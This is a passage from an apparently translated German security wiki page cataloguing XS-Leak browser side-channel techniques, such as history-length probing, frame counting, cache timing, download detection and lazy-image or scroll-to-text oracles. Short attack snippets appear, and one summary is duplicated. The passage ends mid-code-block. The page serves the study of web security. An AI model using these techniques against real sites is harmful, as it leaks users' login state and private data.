`SameSite=None` oder im gleichen Kontext zu sein, wird normalerweise f√ºr diese Art von Angriff ben√∂tigt.

### URL-Maximall√§nge - Clientseite

* **Inklusionsmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Statuscode / Inhalt
* **Weitere Informationen**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Zusammenfassung:** Erkennen von Unterschieden in Antworten aufgrund der Umleitungsl√§nge, die m√∂glicherweise zu gro√ü f√ºr eine Anfrage ist, sodass ein Unterschied bemerkt werden kann.
* **Codebeispiel**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Gem√§√ü der [Chromium-Dokumentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) betr√§gt die maximale URL-L√§nge von Chrome 2 MB.

> Im Allgemeinen gibt es auf der _Webplattform_ keine Grenzen f√ºr die L√§nge von URLs (obwohl 2^31 eine h√§ufige Grenze ist). _Chrome_ begrenzt URLs aus praktischen Gr√ºnden auf eine maximale L√§nge von **2 MB**, um Denial-of-Service-Probleme in der Interprozesskommunikation zu vermeiden.

Daher, wenn die **umgeleitete URL in einem der F√§lle gr√∂√üer ist**, ist es m√∂glich, sie mit einer **URL gr√∂√üer als 2 MB** umzuleiten, um die **L√§ngenbegrenzung** zu erreichen. Wenn dies geschieht, zeigt Chrome eine **`about:blank#blocked`**-Seite an.

Der **bemerkenswerte Unterschied** besteht darin, dass wenn die **Umleitung** abgeschlossen wurde, `window.origin` einen **Fehler** wirft, da ein Cross-Origin nicht auf diese Informationen zugreifen kann. Wenn jedoch die **Grenze** erreicht wurde und die geladene Seite **`about:blank#blocked`** war, bleibt der **`origin`** des Fensters der des **√ºbergeordneten Elements**, was eine **zug√§ngliche Information** ist.

Alle zus√§tzlichen Informationen, die ben√∂tigt werden, um die **2 MB** zu erreichen, k√∂nnen √ºber einen **Hash** in der urspr√ºnglichen URL hinzugef√ºgt werden, sodass sie in der Umleitung verwendet werden.
### Maximale Weiterleitungen

* **Einschlussmethoden**: Fetch API, Frames
* **Feststellbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Zusammenfassung:** Verwenden Sie die Weiterleitungsbeschr√§nkung des Browsers, um das Auftreten von URL-Weiterleitungen festzustellen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Wenn die maximale Anzahl von Weiterleitungen eines Browsers 20 betr√§gt, k√∂nnte ein Angreifer versuchen, seine Seite mit 19 Weiterleitungen zu laden und schlie√ülich das Opfer zur getesteten Seite zu senden. Wenn ein Fehler ausgel√∂st wird, hat die Seite versucht, das Opfer umzuleiten.

### Verlaufsl√§nge

* **Einschlussmethoden**: Frames, Pop-ups
* **Feststellbarer Unterschied**: Weiterleitungen
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Zusammenfassung:** JavaScript-Code manipuliert den Browserverlauf und kann √ºber die L√§ngeneigenschaft darauf zugegriffen werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Die **History API** erm√∂glicht es JavaScript-Code, den Browserverlauf zu manipulieren, der die vom Benutzer besuchten Seiten speichert. Ein Angreifer kann die L√§ngeneigenschaft als Einschlussmethode verwenden, um JavaScript- und HTML-Navigation zu erkennen.\
**√úberpr√ºfen von `history.length`**, indem ein Benutzer zu einer Seite navigiert, sie zur√ºck zum selben Ursprung √§ndert und den neuen Wert von **`history.length`** √ºberpr√ºft.

### Verlaufsl√§nge mit gleicher URL

* **Einschlussmethoden**: Frames, Pop-ups
* **Feststellbarer Unterschied**: Wenn die URL mit der vermuteten √ºbereinstimmt
* **Zusammenfassung:** Es ist m√∂glich zu erraten, ob sich der Ort eines Frames/Pop-ups in einer bestimmten URL befindet, indem die Verlaufsl√§nge missbraucht wird.
* **Codebeispiel**: Unten

Ein Angreifer k√∂nnte JavaScript-Code verwenden, um den Ort des Frames/Pop-ups auf eine vermutete URL zu manipulieren und ihn sofort auf `about:blank` zu √§ndern. Wenn die Verlaufsl√§nge zunahm, bedeutet dies, dass die URL korrekt war und Zeit hatte, zuzunehmen, da die URL nicht neu geladen wird, wenn sie dieselbe ist. Wenn sie nicht zunahm, bedeutet dies, dass versucht wurde, die vermutete URL zu laden, aber weil wir sofort danach `about:blank` geladen haben, hat sich die Verlaufsl√§nge nie erh√∂ht, als die vermutete URL geladen wurde.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Einschlussmethoden**: Frames, Pop-ups
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Zusammenfassung:** Bewertung der Anzahl von iframe-Elementen durch Inspektion der Eigenschaft `window.length`.
* **Codebeispiel**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Das **Z√§hlen der Anzahl von Frames** in einer √ºber `iframe` oder `window.open` ge√∂ffneten Webseite kann helfen, den **Status des Benutzers auf dieser Seite** zu identifizieren.\
Dar√ºber hinaus kann das **kontinuierliche √úberpr√ºfen** der Anzahl von Frames, wenn die Seite immer die gleiche Anzahl von Frames hat, dazu beitragen, ein **Muster** zu identifizieren, das Informationen preisgeben k√∂nnte.

Ein Beispiel f√ºr diese Technik ist, dass in Chrome ein **PDF** durch **Frame-Z√§hlung erkannt** werden kann, da intern ein `embed` verwendet wird. Es gibt [Open URL-Parameter](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113), die eine gewisse Kontrolle √ºber den Inhalt erm√∂glichen, wie z.B. `zoom`, `view`, `page`, `toolbar`, wo diese Technik interessant sein k√∂nnte.

### HTMLElements

* **Einschlussmethoden**: HTML-Elemente
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Zusammenfassung:** Lesen des durchgesickerten Werts zur Unterscheidung zwischen 2 m√∂glichen Zust√§nden
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Informationen, die durch HTML-Elemente preisgegeben werden, sind ein Anliegen in der Websicherheit, insbesondere wenn dynamische Mediendateien basierend auf Benutzerinformationen generiert werden oder Wasserzeichen hinzugef√ºgt werden, die die Mediengr√∂√üe ver√§ndern. Dies kann von Angreifern ausgenutzt werden, um zwischen m√∂glichen Zust√§nden zu unterscheiden, indem die Informationen analysiert werden, die bestimmte HTML-Elemente preisgeben.

### Durch HTML-Elemente preisgegebene Informationen

* **HTMLMediaElement**: Dieses Element zeigt die `Dauer` und die `gepufferten` Zeiten des Mediums an, die √ºber seine API abgerufen werden k√∂nnen. [Weitere Informationen zum HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Es zeigt `videoHeight` und `videoWidth` an. In einigen Browsern stehen zus√§tzliche Eigenschaften wie `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` und `webkitDecodedFrameCount zur Verf√ºgung, die detailliertere Informationen √ºber den Medieninhalt bieten. [Weitere Informationen zum HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Diese Funktion liefert Details zur Video-Wiedergabequalit√§t, einschlie√ülich `totalVideoFrames`, die die Menge der verarbeiteten Videodaten anzeigen k√∂nnen. [Weitere Informationen zu getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Dieses Element gibt die `H√∂he` und `Breite` eines Bildes preis. Wenn ein Bild ung√ºltig ist, geben diese Eigenschaften 0 zur√ºck, und die Funktion `image.decode()` wird abgelehnt, was auf das fehlerhafte Laden des Bildes hinweist. [Weitere Informationen zum HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS-Eigenschaft

* **Einschlussmethoden**: HTML-Elemente
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Zusammenfassung:** Identifizieren von Variationen im Website-Styling, die mit dem Benutzerzustand korrelieren.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webanwendungen k√∂nnen das **Website-Styling je nach Benutzerstatus √§ndern**. Cross-Origin-CSS-Dateien k√∂nnen auf der Angreiferseite mit dem **HTML-Link-Element** eingebettet werden, und die **Regeln** werden auf die Angreiferseite **angewendet**. Wenn eine Seite diese Regeln dynamisch √§ndert, kann ein Angreifer diese **Unterschiede** je nach Benutzerzustand **erkennen**.\
Als Lecktechnik kann der Angreifer die Methode `window.getComputedStyle` verwenden, um die CSS-Eigenschaften eines bestimmten HTML-Elements **auszulesen**. Dadurch kann ein Angreifer beliebige CSS-Eigenschaften lesen, wenn das betroffene Element und der Eigenschaftsname bekannt sind.

### CSS-Verlauf

* **Einschlussmethoden**: HTML-Elemente
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Zusammenfassung:** Feststellen, ob der `:visited`-Stil auf einer URL angewendet wird, was darauf hinweist, dass sie bereits besucht wurde
* **Codebeispiel**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Laut [**diesem**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) funktioniert dies nicht in headless Chrome.
{% endhint %}

Der CSS-Selektor `:visited` wird verwendet, um URLs anders zu gestalten, wenn sie vom Benutzer zuvor besucht wurden. Fr√ºher konnte die Methode `getComputedStyle()` verwendet werden, um diese Stilunterschiede zu identifizieren. Moderne Browser haben jedoch Sicherheitsma√ünahmen implementiert, um zu verhindern, dass diese Methode den Zustand eines Links preisgibt. Diese Ma√ünahmen umfassen das immerw√§hrende Zur√ºckgeben des berechneten Stils, als ob der Link besucht worden w√§re, und die Beschr√§nkung der Stile, die mit dem `:visited`-Selektor angewendet werden k√∂nnen.

Trotz dieser Einschr√§nkungen ist es m√∂glich, den besuchten Zustand eines Links indirekt zu erkennen. Eine Technik besteht darin, den Benutzer dazu zu bringen, mit einem von CSS betroffenen Bereich zu interagieren, insbesondere unter Verwendung der Eigenschaft `mix-blend-mode`. Diese Eigenschaft erm√∂glicht das Mischen von Elementen mit ihrem Hintergrund und kann den besuchten Zustand basierend auf der Benutzerinteraktion m√∂glicherweise preisgeben.

Dar√ºber hinaus kann die Erkennung ohne Benutzerinteraktion durch Ausnutzen der Renderzeiten von Links erreicht werden. Da Browser besuchte und nicht besuchte Links m√∂glicherweise unterschiedlich rendern, kann dies einen messbaren Zeitunterschied in der Darstellung verursachen. In einem Chromium-Bug-Bericht wurde ein Proof of Concept (PoC) erw√§hnt, der diese Technik unter Verwendung mehrerer Links zur Verst√§rkung des Zeitunterschieds demonstriert, wodurch der besuchte Zustand durch Timing-Analyse erkennbar wird.

F√ºr weitere Details zu diesen Eigenschaften und Methoden besuchen Sie deren Dokumentationsseiten:

* `:visited`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### ContentDocument X-Frame Leak

* **Inklusionsmethoden**: Frames
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Zusammenfassung:** In Google Chrome wird eine dedizierte Fehlerseite angezeigt, wenn eine Seite aufgrund von X-Frame-Options-Beschr√§nkungen daran gehindert wird, auf einer Cross-Origin-Site eingebettet zu werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome wird bei einer Seite mit dem `X-Frame-Options`-Header, der auf "deny" oder "same-origin" gesetzt ist und als Objekt eingebettet wird, eine Fehlerseite angezeigt. Chrome gibt f√ºr das `contentDocument`-Eigenschaft dieses Objekts ein leeres Dokumentobjekt zur√ºck (anstatt `null`), im Gegensatz zu iframes oder anderen Browsern. Angreifer k√∂nnten dies ausnutzen, indem sie das leere Dokument erkennen und m√∂glicherweise Informationen √ºber den Zustand des Benutzers preisgeben, insbesondere wenn Entwickler den X-Frame-Options-Header inkonsistent setzen und Fehlerseiten oft √ºbersehen. Ein Bewusstsein und eine konsistente Anwendung von Sicherheitsheadern sind entscheidend, um solche Lecks zu verhindern.

### Download-Erkennung

* **Inklusionsmethoden**: Frames, Pop-ups
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Zusammenfassung:** Ein Angreifer kann Dateidownloads erkennen, indem er Iframes nutzt; die fortgesetzte Zug√§nglichkeit des Iframes deutet auf einen erfolgreichen Dateidownload hin.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Der `Content-Disposition`-Header, speziell `Content-Disposition: attachment`, weist den Browser an, den Inhalt herunterzuladen, anstatt ihn inline anzuzeigen. Dieses Verhalten kann ausgenutzt werden, um festzustellen, ob ein Benutzer Zugriff auf eine Seite hat, die einen Dateidownload ausl√∂st. In Chromium-basierten Browsern gibt es einige Techniken, um dieses Download-Verhalten zu erkennen:

1. **√úberwachung der Download-Leiste**:
* Wenn eine Datei in Chromium-basierten Browsern heruntergeladen wird, erscheint am unteren Rand des Browserfensters eine Download-Leiste.
* Durch √úberwachung von √Ñnderungen in der Fensterh√∂he k√∂nnen Angreifer auf das Erscheinen der Download-Leiste schlie√üen, was darauf hindeutet, dass ein Download initiiert wurde.
2. **Download-Navigation mit Iframes**:
* Wenn eine Seite einen Dateidownload mit dem `Content-Disposition: attachment`-Header ausl√∂st, f√ºhrt dies nicht zu einem Navigationsereignis.
* Durch Laden des Inhalts in einem iframe und √úberwachung von Navigationsereignissen ist es m√∂glich zu √ºberpr√ºfen, ob die Inhaltsdisposition einen Dateidownload verursacht (keine Navigation) oder nicht.
3. **Download-Navigation ohne Iframes**:
* √Ñhnlich wie bei der iframe-Technik beinhaltet diese Methode die Verwendung von `window.open` anstelle eines iframes.
* Durch √úberwachung von Navigationsereignissen im neu ge√∂ffneten Fenster kann festgestellt werden, ob ein Dateidownload ausgel√∂st wurde (keine Navigation) oder ob der Inhalt inline angezeigt wird (Navigation erfolgt).

In Szenarien, in denen nur eingeloggte Benutzer solche Downloads ausl√∂sen k√∂nnen, k√∂nnen diese Techniken verwendet werden, um indirekt auf den Authentifizierungszustand des Benutzers basierend auf der Reaktion des Browsers auf die Download-Anfrage zu schlie√üen.

### Umgehung des partitionierten HTTP-Caches <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inklusionsmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Timing
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Zusammenfassung:** Ein Angreifer kann Dateidownloads erkennen, indem er Iframes nutzt; die fortgesetzte Zug√§nglichkeit des Iframes deutet auf einen erfolgreichen Dateidownload hin.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (von [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Deshalb ist diese Technik interessant: Chrome hat jetzt **Cache-Partitionierung**, und der Cache-Schl√ºssel der neu ge√∂ffneten Seite lautet: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, aber wenn ich eine ngrok-Seite √∂ffne und darin fetch verwende, wird der Cache-Schl√ºssel sein: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, der **Cache-Schl√ºssel ist unterschiedlich**, daher kann der Cache nicht geteilt werden. Weitere Details finden Sie hier: [Sicherheit und Datenschutz durch Cache-Partitionierung gewinnen](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Kommentar von [**hier**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Wenn eine Website `example.com` eine Ressource von `*.example.com/resource` einbindet, wird diese Ressource denselben Cachingschl√ºssel haben, als ob die Ressource direkt √ºber eine Top-Level-Navigation angefordert worden w√§re. Das liegt daran, dass der Cachingschl√ºssel aus dem Top-Level _eTLD+1_ und dem Frame _eTLD+1_ besteht.

Da der Zugriff auf den Cache schneller ist als das Laden einer Ressource, ist es m√∂glich, zu versuchen, den Ort einer Seite zu √§ndern und ihn 20 ms (zum Beispiel) sp√§ter abzubrechen. Wenn sich der Ursprung nach dem Abbruch ge√§ndert hat, bedeutet dies, dass die Ressource im Cache war.\
Oder man k√∂nnte einfach **ein fetch an die potenziell gecachte Seite senden und die Zeit messen, die es dauert**.

### Manuelle Weiterleitung <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inklusionsmethoden**: Fetch-API
* **Erkennbarer Unterschied**: Weiterleitungen
* **Weitere Informationen**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Zusammenfassung:** Es ist m√∂glich festzustellen, ob eine Antwort auf eine Fetch-Anfrage eine Weiterleitung ist
* **Codebeispiel**:

![](<../.gitbook/assets/image (652).png>)

### Fetch mit AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inklusionsmethoden**: Fetch-API
* **Erkennbarer Unterschied**: Timing
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Zusammenfassung:** Es ist m√∂glich zu versuchen, eine Ressource zu laden und bevor sie geladen wird, wird der Ladevorgang unterbrochen. Abh√§ngig davon, ob ein Fehler ausgel√∂st wird, war die Ressource im Cache oder nicht.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Verwenden Sie _**fetch**_ und _**setTimeout**_ mit einem **AbortController**, um sowohl festzustellen, ob die **Ressource im Cache ist**, als auch um eine bestimmte Ressource aus dem Browsercache zu entfernen. Dar√ºber hinaus erfolgt der Prozess ohne Zwischenspeichern neuer Inhalte.
### Skriptverschmutzung

* **Einschlussmethoden**: HTML-Elemente (Skript)
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Zusammenfassung:** Es ist m√∂glich, **eingebaute Funktionen zu √ºberschreiben** und deren Argumente zu lesen, selbst von einem **cross-origin Skript** (das nicht direkt gelesen werden kann), was m√∂glicherweise zu einem **Leck wertvoller Informationen** f√ºhren kann.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service-Mitarbeiter <a href="#service-workers" id="service-workers"></a>

* **Einschlussmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Zusammenfassung:** Messen Sie die Ausf√ºhrungszeit einer Website mithilfe von Service-Mitarbeitern.
* **Codebeispiel**:

In dem gegebenen Szenario ergreift der Angreifer die Initiative, um einen **Service-Mitarbeiter** in einer seiner Domains, speziell "attacker.com", zu registrieren. Als n√§chstes √∂ffnet der Angreifer ein neues Fenster auf der Zielseite vom Hauptdokument aus und weist den **Service-Mitarbeiter** an, einen Timer zu starten. Wenn das neue Fenster zu laden beginnt, navigiert der Angreifer auf die Seite, die vom **Service-Mitarbeiter** verwaltet wird, √ºber den in Schritt zwei erhaltenen Verweis.

Bei Ankunft der Anfrage, die im vorherigen Schritt initiiert wurde, antwortet der **Service-Mitarbeiter** mit einem Statuscode **204 (Kein Inhalt)**, wodurch der Navigationsprozess effektiv beendet wird. Zu diesem Zeitpunkt erfasst der **Service-Mitarbeiter** eine Messung des zuvor in Schritt zwei gestarteten Timers. Diese Messung wird durch die Dauer von JavaScript beeinflusst, die Verz√∂gerungen im Navigationsprozess verursacht.

{% hint style="warning" %}
Bei einer Ausf√ºhrungszeit ist es m√∂glich, **Netzfaktoren zu eliminieren**, um **genauere Messungen** zu erhalten. Zum Beispiel, indem die Ressourcen, die von der Seite verwendet werden, vor dem Laden der Seite geladen werden.
{% endhint %}

### Abrufzeit

* **Einschlussmethoden**: Fetch API
* **Erkennbarer Unterschied**: Zeitmessung (generell aufgrund des Seiteninhalts, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Zusammenfassung:** Verwenden Sie [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die f√ºr eine Anfrage ben√∂tigt wird. Andere Uhren k√∂nnten verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Einschlussmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Zeitmessung (generell aufgrund des Seiteninhalts, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Zusammenfassung:** Verwenden Sie [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die f√ºr eine Anfrage ben√∂tigt wird, indem Sie `window.open` verwenden. Andere Uhren k√∂nnten verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos Workflows zu erstellen und zu **automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Mit HTML oder Re-Injektion

Hier finden Sie Techniken zum Exfiltrieren von Informationen aus einem Cross-Origin-HTML, indem Sie HTML-Inhalte einf√ºgen. Diese Techniken sind interessant in F√§llen, in denen Sie aus irgendeinem Grund HTML einf√ºgen k√∂nnen, aber keinen JS-Code einf√ºgen k√∂nnen.

### H√§ngende Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Lazy Loading von Bildern

Wenn Sie Inhalte **exfiltrieren** m√ºssen und HTML vor dem Geheimnis hinzuf√ºgen k√∂nnen, sollten Sie die **√ºblichen h√§ngenden Markup-Techniken** √ºberpr√ºfen.\
Wenn Sie jedoch aus irgendeinem Grund **Buchstabe f√ºr Buchstabe** vorgehen m√ºssen (vielleicht erfolgt die Kommunikation √ºber einen Cache-Treffer), k√∂nnen Sie diesen Trick verwenden.

**Bilder** in HTML haben ein "**loading**"-Attribut, dessen Wert "**lazy**" sein kann. In diesem Fall wird das Bild geladen, wenn es angezeigt wird, und nicht w√§hrend das Seite geladen wird:
```html
<img src=/something loading=lazy >
```
Daher k√∂nnen Sie **eine Menge Junk-Zeichen hinzuf√ºgen** (zum Beispiel **Tausende von "W"s**), um die Webseite zu f√ºllen, bevor das Geheimnis hinzugef√ºgt wird oder etwas wie `<br><canvas height="1850px"></canvas><br>` hinzuzuf√ºgen.\
Dann, wenn zum Beispiel unsere **Injection vor der Flagge erscheint**, wird das **Bild geladen**, aber wenn es **nach der Flagge** erscheint, wird die Flagge + der Junk **verhindern, dass es geladen wird** (Sie m√ºssen mit der Menge des zu platzierenden Junks spielen). Dies ist in [**diesem Writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) passiert.

Eine andere Option w√§re die Verwendung des **Scroll-to-text-fragment**, wenn erlaubt:

#### Scroll-to-text-fragment

Sie lassen jedoch den **Bot auf die Seite zugreifen** mit etwas wie
```
#:~:text=SECR
```
So wird die Webseite ungef√§hr aussehen: **`https://victim.com/post.html#:~:text=SECR`**

Wo post.html die Angreifer-Junk-Zeichen und das Lazy-Load-Bild enth√§lt und dann das Geheimnis des Bots hinzugef√ºgt wird.

Was dieser Text tun wird, ist, den Bot auf jeden Text in der Seite zugreifen zu lassen, der den Text `SECR` enth√§lt. Da dieser Text das Geheimnis ist und direkt **unter dem Bild** liegt, wird das **Bild nur geladen, wenn das geratene Geheimnis korrekt ist**. So haben Sie Ihr Orakel, um das Geheimnis Zeichen f√ºr Zeichen **auszulesen**.

Einige Codebeispiele zur Ausnutzung dieses Problems: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Zeitbasiertes Lazy Loading von Bildern

Wenn es **nicht m√∂glich ist, ein externes Bild zu laden**, das dem Angreifer anzeigen k√∂nnte, dass das Bild geladen wurde, w√§re eine andere Option, **mehrmals zu versuchen, das Zeichen zu erraten und das zu messen**. Wenn das Bild geladen wird, dauern alle Anfragen l√§nger als wenn das Bild nicht geladen wird. Dies wurde in der [**L√∂sung dieses Write-ups**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **zusammengefasst:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Wenn `jQuery(location.hash)` verwendet wird, ist es m√∂glich, √ºber die Zeit festzustellen, ob bestimmter HTML-Inhalt vorhanden ist, dies liegt daran, dass, wenn der Selektor `main[id='site-main']` nicht √ºbereinstimmt, der Rest der **Selektoren nicht √ºberpr√ºft werden muss**:
```javascript
